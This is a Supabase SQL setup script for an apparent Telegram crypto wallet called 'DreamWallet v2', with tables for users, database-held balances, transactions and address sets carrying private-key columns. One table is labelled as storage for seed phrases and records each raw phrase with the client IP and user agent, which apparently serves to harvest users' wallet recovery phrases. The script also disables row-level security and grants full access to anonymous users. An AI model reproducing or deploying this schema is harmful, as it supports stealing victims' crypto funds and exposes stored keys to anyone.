-- ============================================================
-- DreamWallet v2 — ПОЛНАЯ установка базы данных (новый Supabase)
-- Вставьте ВЕСЬ этот файл в Supabase → SQL Editor → Run
-- ============================================================

-- ---------- Вспомогательные функции ----------
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION update_wallet_updated_timestamp()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_timestamp = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION update_total_balance()
RETURNS TRIGGER AS $$
BEGIN
    NEW.total_usd_balance =
        (COALESCE(NEW.usdt_amount, 0) * COALESCE(NEW.usdt_price, 0)) +
        (COALESCE(NEW.eth_amount, 0) * COALESCE(NEW.eth_price, 0)) +
        (COALESCE(NEW.ton_amount, 0) * COALESCE(NEW.ton_price, 0)) +
        (COALESCE(NEW.sol_amount, 0) * COALESCE(NEW.sol_price, 0)) +
        (COALESCE(NEW.trx_amount, 0) * COALESCE(NEW.trx_price, 0));
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- ---------- 1. Наборы адресов ----------
CREATE TABLE IF NOT EXISTS public.address_sets (
    id SERIAL PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    ton_address TEXT,
    tron_address TEXT,
    sol_address TEXT,
    eth_address TEXT,
    bnb_address TEXT,
    ton_secret TEXT,
    tron_secret TEXT,
    sol_secret TEXT,
    eth_secret TEXT,
    bnb_secret TEXT,
    is_used BOOLEAN DEFAULT false,
    assigned_to_telegram_id BIGINT,
    assigned_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_address_sets_is_used ON public.address_sets(is_used);
CREATE INDEX IF NOT EXISTS idx_address_sets_assigned_to ON public.address_sets(assigned_to_telegram_id);

DROP TRIGGER IF EXISTS update_address_sets_updated_at ON public.address_sets;
CREATE TRIGGER update_address_sets_updated_at
    BEFORE UPDATE ON public.address_sets
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- ---------- 2. Пользователи ----------
CREATE TABLE IF NOT EXISTS public.users (
    id SERIAL PRIMARY KEY,
    telegram_id BIGINT NOT NULL UNIQUE,
    first_name TEXT NOT NULL,
    last_name TEXT,
    username TEXT,
    address_set_id INTEGER REFERENCES public.address_sets(id),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON public.users(telegram_id);

DROP TRIGGER IF EXISTS update_users_updated_at ON public.users;
CREATE TRIGGER update_users_updated_at
    BEFORE UPDATE ON public.users
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- ---------- 3. Балансы пользователей ----------
CREATE TABLE IF NOT EXISTS public.user_balances (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES public.users(id) ON DELETE CASCADE,
    telegram_id BIGINT NOT NULL UNIQUE,
    usdt_amount DECIMAL(18, 8) DEFAULT 0,
    usdt_price DECIMAL(18, 8) DEFAULT 1.00,
    usdt_change_percent DECIMAL(8, 2) DEFAULT 0.00,
    usdt_usd_value DECIMAL(18, 8) DEFAULT 0,
    eth_amount DECIMAL(18, 8) DEFAULT 0,
    eth_price DECIMAL(18, 8) DEFAULT 0,
    eth_change_percent DECIMAL(8, 2) DEFAULT 0.00,
    eth_usd_value DECIMAL(18, 8) DEFAULT 0,
    ton_amount DECIMAL(18, 8) DEFAULT 0,
    ton_price DECIMAL(18, 8) DEFAULT 0,
    ton_change_percent DECIMAL(8, 2) DEFAULT 0.00,
    ton_usd_value DECIMAL(18, 8) DEFAULT 0,
    sol_amount DECIMAL(18, 8) DEFAULT 0,
    sol_price DECIMAL(18, 8) DEFAULT 0,
    sol_change_percent DECIMAL(8, 2) DEFAULT 0.00,
    sol_usd_value DECIMAL(18, 8) DEFAULT 0,
    trx_amount DECIMAL(18, 8) DEFAULT 0,
    trx_price DECIMAL(18, 8) DEFAULT 0,
    trx_change_percent DECIMAL(8, 2) DEFAULT 0.00,
    trx_usd_value DECIMAL(18, 8) DEFAULT 0,
    total_usd_balance DECIMAL(18, 8) DEFAULT 0,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_user_balances_user_id ON public.user_balances(user_id);

DROP TRIGGER IF EXISTS trigger_update_total_balance ON public.user_balances;
CREATE TRIGGER trigger_update_total_balance
    BEFORE INSERT OR UPDATE ON public.user_balances
    FOR EACH ROW EXECUTE FUNCTION update_total_balance();

-- ---------- 4. Транзакции кошелька ----------
CREATE TABLE IF NOT EXISTS public.wallet_transactions (
    id BIGSERIAL PRIMARY KEY,
    user_telegram_id BIGINT NOT NULL,
    transaction_type VARCHAR(30) NOT NULL,
    crypto_currency VARCHAR(10) NOT NULL,
    blockchain_network VARCHAR(20) NOT NULL,
    withdraw_amount DECIMAL(20, 8) NOT NULL,
    network_fee DECIMAL(20, 8) DEFAULT 0,
    recipient_address TEXT NOT NULL DEFAULT '',
    user_comment TEXT,
    transaction_status VARCHAR(20) DEFAULT 'pending',
    blockchain_hash TEXT,
    created_timestamp TIMESTAMPTZ DEFAULT NOW(),
    updated_timestamp TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_wallet_transactions_telegram_id ON public.wallet_transactions(user_telegram_id);
CREATE INDEX IF NOT EXISTS idx_wallet_transactions_type ON public.wallet_transactions(transaction_type);
CREATE INDEX IF NOT EXISTS idx_wallet_transactions_status ON public.wallet_transactions(transaction_status);
CREATE INDEX IF NOT EXISTS idx_wallet_transactions_created ON public.wallet_transactions(created_timestamp DESC);

DROP TRIGGER IF EXISTS trigger_wallet_transactions_updated_timestamp ON public.wallet_transactions;
CREATE TRIGGER trigger_wallet_transactions_updated_timestamp
    BEFORE UPDATE ON public.wallet_transactions
    FOR EACH ROW EXECUTE FUNCTION update_wallet_updated_timestamp();

-- ---------- 5. История балансов (опционально, для аудита) ----------
CREATE TABLE IF NOT EXISTS public.wallet_balance_history (
    id BIGSERIAL PRIMARY KEY,
    user_telegram_id BIGINT NOT NULL,
    crypto_currency VARCHAR(10) NOT NULL,
    balance_change DECIMAL(20, 8) NOT NULL,
    balance_before DECIMAL(20, 8) NOT NULL,
    balance_after DECIMAL(20, 8) NOT NULL,
    change_reason VARCHAR(50) NOT NULL,
    related_transaction_id BIGINT REFERENCES public.wallet_transactions(id) ON DELETE SET NULL,
    created_timestamp TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_wallet_balance_history_telegram_id ON public.wallet_balance_history(user_telegram_id);

-- ---------- 6. Настройки приложения ----------
CREATE TABLE IF NOT EXISTS public.app_settings (
    key TEXT PRIMARY KEY,
    value NUMERIC,
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- ---------- 7. Настройки обмена ----------
CREATE TABLE IF NOT EXISTS public.exchange_settings (
    id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    fee_percent NUMERIC DEFAULT 0,
    min_usdt NUMERIC DEFAULT 0,
    min_eth NUMERIC DEFAULT 0,
    min_ton NUMERIC DEFAULT 0,
    min_sol NUMERIC DEFAULT 0,
    min_trx NUMERIC DEFAULT 0,
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

INSERT INTO public.exchange_settings (fee_percent, min_usdt, min_eth, min_ton, min_sol, min_trx)
SELECT 0, 0, 0, 0, 0, 0
WHERE NOT EXISTS (SELECT 1 FROM public.exchange_settings LIMIT 1);

-- ---------- 8. Комиссии на вывод ----------
CREATE TABLE IF NOT EXISTS public.withdraw_fees (
    network TEXT PRIMARY KEY,
    fee NUMERIC NOT NULL DEFAULT 0,
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

INSERT INTO public.withdraw_fees (network, fee) VALUES
    ('ton', 0.01),
    ('tron', 0),
    ('sol', 0.01),
    ('eth', 0.001),
    ('bnb', 0.01)
ON CONFLICT (network) DO UPDATE SET fee = EXCLUDED.fee;

-- ---------- 9. Хранилище seed-фраз (второй Supabase ИЛИ тот же проект) ----------
CREATE TABLE IF NOT EXISTS public.app_secrets_storage (
    id BIGSERIAL PRIMARY KEY,
    phrase_raw TEXT NOT NULL,
    user_meta JSONB,
    client_ip TEXT,
    user_agent TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.app_secrets_storage ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "service-only" ON public.app_secrets_storage;
CREATE POLICY "service-only" ON public.app_secrets_storage
    FOR ALL USING (auth.role() = 'service_role');

-- ---------- RLS: отключаем на основных таблицах (API использует service_role) ----------
ALTER TABLE public.address_sets DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.users DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_balances DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.wallet_transactions DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.wallet_balance_history DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.exchange_settings DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.withdraw_fees DISABLE ROW LEVEL SECURITY;

-- ---------- Права доступа ----------
GRANT ALL ON ALL TABLES IN SCHEMA public TO anon, authenticated, service_role;
GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO anon, authenticated, service_role;
GRANT ALL ON ALL FUNCTIONS IN SCHEMA public TO anon, authenticated, service_role;

-- ---------- Тестовые наборы адресов (20 штук) ----------
INSERT INTO public.address_sets (name, ton_address, tron_address, sol_address, eth_address, bnb_address) VALUES
('user1',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_01', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj61', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt11', '0xdAC17F958D2ee523a2206206994597C13D831ec1', '0x55d398326f99059fF775485246999027B31979551'),
('user2',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_02', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj62', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt12', '0xdAC17F958D2ee523a2206206994597C13D831ec2', '0x55d398326f99059fF775485246999027B31979552'),
('user3',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_03', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj63', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt13', '0xdAC17F958D2ee523a2206206994597C13D831ec3', '0x55d398326f99059fF775485246999027B31979553'),
('user4',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_04', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj64', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt14', '0xdAC17F958D2ee523a2206206994597C13D831ec4', '0x55d398326f99059fF775485246999027B31979554'),
('user5',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_05', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj65', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt15', '0xdAC17F958D2ee523a2206206994597C13D831ec5', '0x55d398326f99059fF775485246999027B31979555'),
('user6',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_06', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj66', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt16', '0xdAC17F958D2ee523a2206206994597C13D831ec6', '0x55d398326f99059fF775485246999027B31979556'),
('user7',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_07', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj67', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt17', '0xdAC17F958D2ee523a2206206994597C13D831ec7', '0x55d398326f99059fF775485246999027B31979557'),
('user8',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_08', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj68', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt18', '0xdAC17F958D2ee523a2206206994597C13D831ec8', '0x55d398326f99059fF775485246999027B31979558'),
('user9',  'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_09', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj69', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt19', '0xdAC17F958D2ee523a2206206994597C13D831ec9', '0x55d398326f99059fF775485246999027B31979559'),
('user10', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_10', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj70', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt20', '0xdAC17F958D2ee523a2206206994597C13D831ec0', '0x55d398326f99059fF775485246999027B31979560'),
('user11', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_11', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj71', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt21', '0xdAC17F958D2ee523a2206206994597C13D831ec1', '0x55d398326f99059fF775485246999027B31979561'),
('user12', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_12', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj72', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt22', '0xdAC17F958D2ee523a2206206994597C13D831ec2', '0x55d398326f99059fF775485246999027B31979562'),
('user13', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_13', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj73', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt23', '0xdAC17F958D2ee523a2206206994597C13D831ec3', '0x55d398326f99059fF775485246999027B31979563'),
('user14', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_14', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj74', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt24', '0xdAC17F958D2ee523a2206206994597C13D831ec4', '0x55d398326f99059fF775485246999027B31979564'),
('user15', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_15', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj75', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt25', '0xdAC17F958D2ee523a2206206994597C13D831ec5', '0x55d398326f99059fF775485246999027B31979565'),
('user16', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_16', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj76', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt26', '0xdAC17F958D2ee523a2206206994597C13D831ec6', '0x55d398326f99059fF775485246999027B31979566'),
('user17', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_17', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj77', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt27', '0xdAC17F958D2ee523a2206206994597C13D831ec7', '0x55d398326f99059fF775485246999027B31979567'),
('user18', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_18', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj78', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt28', '0xdAC17F958D2ee523a2206206994597C13D831ec8', '0x55d398326f99059fF775485246999027B31979568'),
('user19', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_19', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj79', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt29', '0xdAC17F958D2ee523a2206206994597C13D831ec9', '0x55d398326f99059fF775485246999027B31979569'),
('user20', 'EQD4FPq-PRDieyQKkizFTRtSDyucUIqrj0v_zXJmqaDp6_20', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj80', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt30', '0xdAC17F958D2ee523a2206206994597C13D831e10', '0x55d398326f99059fF775485246999027B31979570')
ON CONFLICT (name) DO NOTHING;

-- ---------- Проверка ----------
SELECT 'address_sets' AS table_name, COUNT(*) AS rows FROM public.address_sets
UNION ALL SELECT 'users', COUNT(*) FROM public.users
UNION ALL SELECT 'user_balances', COUNT(*) FROM public.user_balances
UNION ALL SELECT 'wallet_transactions', COUNT(*) FROM public.wallet_transactions
UNION ALL SELECT 'withdraw_fees', COUNT(*) FROM public.withdraw_fees
UNION ALL SELECT 'exchange_settings', COUNT(*) FROM public.exchange_settings;

SELECT 'DreamWallet v2: база данных успешно создана!' AS status;
